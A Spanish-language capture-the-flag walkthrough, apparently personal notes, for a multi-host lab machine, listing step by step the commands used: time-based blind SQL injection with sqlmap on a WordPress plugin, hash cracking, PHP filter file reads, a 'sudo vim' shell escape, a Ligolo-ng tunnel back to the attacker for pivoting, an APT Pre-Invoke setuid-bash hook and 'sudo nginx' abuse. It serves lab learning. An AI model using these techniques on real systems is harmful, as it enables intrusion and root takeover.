---
tags: [ctf, thehackerslabs, linux, walkthrough, pivoting]
tipo: walkthrough
estado: resuelto
---

# THLCPPTV16 — Walkthrough

> [!note] **comando → salida relevante → interpretación → por qué**. Salidas *(reconstrucción)* del roadmap.
> Esta máquina es **multi-host**: los pasos de pivote van marcados.

## Paso 1 — WordPress + My Calendar (SQLi time-based blind)

**Comando**
```bash
echo "192.168.56.163 examen.thlcpptv16.thl" | sudo tee -a /etc/hosts
wpscan --url http://examen.thlcpptv16.thl --enumerate vp,vt,u
# My Calendar vulnerable a SQLi time-based blind
sqlmap -u "http://examen.thlcpptv16.thl/...calendar..." --technique=T --dbs
```

**Interpretación / por qué**
- Un plugin vulnerable a **SQLi ciega** permite extraer el hash del usuario **Tom**. Se usa time-based porque la respuesta no cambia visiblemente.

## Paso 2 — Crackeo del hash (phpass) → WordPress

**Comando**
```bash
echo '<hash_phpass>' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# login en wp-admin, subir plugin/tema con PHP -> shell
```

**Interpretación / por qué**
- Los hashes **phpass** (WordPress) se crackean con John. Con acceso admin se sube un plugin/tema con PHP → RCE.

## Paso 3 — Segundo vhost + PHP filters / WrapWrap

**Comando**
```bash
echo "192.168.56.163 examendos.thlcpptv16.thl" | sudo tee -a /etc/hosts
# LFI -> php://filter/convert.base64-encode
curl -s 'http://examendos.thlcpptv16.thl/index.php?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d
# encadenar filtros (WrapWrap) para leer/codificar
```

**Interpretación / por qué**
- **PHP filters** permiten leer código; **WrapWrap** encadena wrappers. Se obtiene la config y credenciales reutilizables.

## Paso 4 — SSH Tom → alias SSH → Rafael → `sudo vim`

**Comando**
```bash
ssh tom@192.168.56.163
cat ~/.ssh/config            # alias hacia Rafael
ssh rafael
sudo -l
sudo vim -c ':!/bin/sh'
```

**Interpretación / por qué**
- Reutilización de credenciales → SSH. Un **alias SSH** salta al host de Rafael. `sudo vim` escapa a shell (`:!sh`) → root de Rafael.

## Paso 5 — Pivoting: Ligolo-ng + WireGuard

**Comando**
```bash
# Atacante
./proxy -selfcert -laddr 0.0.0.0:11601
# Victima (agent)
./agent -connect 192.168.56.1:11601 -ignore-cert
# En la sesión Ligolo: añadir ruta a la red interna
# WireGuard para encaminar a los siguientes hosts
```

**Interpretación / por qué**
- **Ligolo-ng** crea el túnel; **WireGuard** aporta el enrutado. Hay que distinguir red de **acceso inicial**, **intermedias** y **objetivo final**.

## Paso 6 — ROT13 → SSH Jerry

**Comando**
```bash
echo '<texto_rot13>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
ssh jerry@<host_interno>
```

**Interpretación / por qué**
- Un mensaje en **ROT13** entrega la credencial de Jerry.

## Paso 7 — APT Pre-Invoke → root de Jerry

**Comando**
```bash
# Config de APT escribible por el usuario
ls -la /etc/apt/apt.conf.d/
echo 'APT::Update::Pre-Invoke {"cp /bin/bash /tmp/bash; chmod +s /tmp/bash";};' \
  > /etc/apt/apt.conf.d/99x
sudo apt update
/tmp/bash -p
```

**Interpretación / por qué**
- Los hooks de APT (**Pre-Invoke**) se ejecutan como **root**: configuración escribible ⇒ escalada.

## Paso 8 — Credenciales del último host → `sudo nginx` → root final

**Comando**
```bash
# con las credenciales halladas
sudo -l
sudo nginx -c /tmp/nginx.conf      # o abuso de logs/config
```

**Interpretación / por qué**
- `sudo nginx` permite cargar una config propia y abusar de ella (logs/`error_log`/`root`) para escribir y ejecutar como root.

## Qué funcionó

- SQLi ciega en el plugin de WordPress.
- Encadenar **filtros PHP + WrapWrap**.
- **Ligolo-ng + WireGuard** para el pivote.
- Hooks de **APT** y `sudo nginx` como escaladas.

## Qué falló (y por qué)

- Fuerza bruta online de WordPress descartada frente a crackeo de hash.

## Qué aprendí

- Metodología **multi-host**: documentar redes y saltos.
- Diferenciar acceso inicial / intermedios / objetivo final.
